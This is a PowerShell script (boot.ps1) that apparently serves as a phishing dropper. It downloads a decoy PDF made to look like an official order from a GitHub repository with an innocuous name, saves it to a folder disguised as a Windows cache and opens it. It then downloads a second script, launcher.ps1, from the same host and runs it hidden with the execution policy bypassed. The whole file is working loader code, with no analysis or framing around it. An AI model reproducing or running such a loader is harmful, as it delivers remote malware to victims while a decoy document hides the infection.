# === DEBUG LOGGING ===
"boot.ps1 started" | Out-File "C:\Users\Public\boot_debug.txt" -Append

try {
    # === SETUP ===
    $envData = Get-Item env:APPDATA
    $cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
    if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}
    
    # === DOWNLOAD PDF ===
    $pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/Nakaz_No._661_vid_02.03.2026-4.pdf"
    $pdfPath = Join-Path $cachePath "Nakaz_No._661_vid_02.03.2026-4.pdf"
    
    "Downloading PDF from: $pdfUrl" | Out-File "C:\Users\Public\boot_debug.txt" -Append
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($pdfUrl, $pdfPath)
    "PDF downloaded to: $pdfPath" | Out-File "C:\Users\Public\boot_debug.txt" -Append
    
    # === OPEN PDF ===
    "Opening PDF" | Out-File "C:\Users\Public\boot_debug.txt" -Append
    Start-Process $pdfPath -WindowStyle Normal
    
    # === DOWNLOAD LAUNCHER ===
    $launcherUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
    $launcherPath = Join-Path $cachePath "launcher.ps1"
    
    "Downloading launcher from: $launcherUrl" | Out-File "C:\Users\Public\boot_debug.txt" -Append
    $webClient.DownloadFile($launcherUrl, $launcherPath)
    "Launcher downloaded to: $launcherPath" | Out-File "C:\Users\Public\boot_debug.txt" -Append
    
    # === EXECUTE LAUNCHER ===
    "Executing launcher" | Out-File "C:\Users\Public\boot_debug.txt" -Append
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" -WindowStyle Hidden
    
    "boot.ps1 completed successfully" | Out-File "C:\Users\Public\boot_debug.txt" -Append
}
catch {
    "ERROR: $($_.Exception.Message)" | Out-File "C:\Users\Public\boot_debug.txt" -Append
}
